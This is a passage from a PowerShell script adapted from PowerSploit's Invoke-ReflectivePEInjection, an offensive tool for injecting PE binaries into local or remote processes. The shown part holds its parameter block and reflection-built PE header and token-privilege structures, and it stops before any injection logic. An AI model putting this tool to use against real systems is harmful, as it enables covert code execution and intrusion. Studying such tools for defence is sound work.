# This code was derived from https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

function Invoke-ReflectivePEInjection {

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
